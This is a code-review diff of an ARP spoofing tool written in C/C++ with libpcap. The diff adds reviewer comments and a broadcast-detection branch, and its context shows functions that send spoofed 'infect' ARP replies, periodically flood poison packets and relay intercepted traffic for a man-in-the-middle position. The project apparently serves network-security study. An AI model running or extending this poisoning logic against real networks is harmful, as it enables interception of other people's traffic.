@@ -11,7 +11,7 @@
 #define RELAY 1
 #define INFECT_REPLY 2
 #define INFECT_REQUEST 3
-#define INFECT_BROADCAST 4
+#define INFECT_BROADCAST 4 //***use enum
 #define MAX_AGENTS 40
 #pragma pack(push, 1)
 struct Spoof final{
@@ -27,7 +27,7 @@ public:
     EthArpPacket infctpckt;
 };
 #pragma pack(pop)
-Spoof spoofarr[40];
+Spoof spoofarr[40];//***vector or list
 int idx=0;
 //usage
 void usage() {
@@ -114,7 +114,7 @@ Mac getmac(pcap_t* handle, Ip mip, Ip sip, Mac mmac){
 //send relay packet
 void Relay(pcap_t* handle, const u_char* packet, Mac mmac, int size){
 	int flag=0;
-	u_char* relaypacket=(u_char*)malloc(sizeof(char)*size);
+	u_char* relaypacket=(u_char*)malloc(sizeof(char)*size); //**global or class 
 	memcpy(relaypacket, packet, sizeof(char)*size);
 	EthHdr* ethhdr=(EthHdr*)relaypacket;
 	IpHdr* iphdr=(IpHdr*)(relaypacket+ETHHDRSIZE);// arp packets - already filtered
@@ -147,7 +147,7 @@ void SendInfectFlood(pcap_t* handle){
 //send arp reply to targetd pair
 void SendInfect(pcap_t* handle, Ip sip){
 	for(int i=0; i<idx; i++){
-		if((uint32_t)spoofarr[i].sip_==ntohl(sip)){
+		if((uint32_t)spoofarr[i].sip_==ntohl(sip)){ //src&&dst ip check
 			printf("[info]re-send arp..\n");
 			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spoofarr[i].infctpckt), sizeof(EthArpPacket));
 			if (res != 0) {
@@ -172,8 +172,10 @@ int parsing(const u_char* packet, Ip mip){
 			else
 				return INFECT_REPLY;//reply&unicast
 		}
-		else
-			return INFECT_REQUEST;//request&unicast
+		else if(ethhdr->dmac_==Mac("ff:ff:ff:ff:ff:ff"))
+				return INFECT_BROADCAST;//reply&broadcast
+			else
+				return INFECT_REQUEST;//request&unicast
 	}
 	else {
 		IpHdr* iphdr=(IpHdr*)(packet+ETHHDRSIZE);
@@ -251,7 +253,7 @@ int main(int argc, char* argv[]) {
 		if((end - start)>20000){//time to spread arp
 			SendInfectFlood(handle);
 			start=clock();
-		}
+		} //**thread!!
 		struct pcap_pkthdr* header;
 		int res = pcap_next_ex(handle, &header, &rawpacket);
 		if (res == 0) continue;
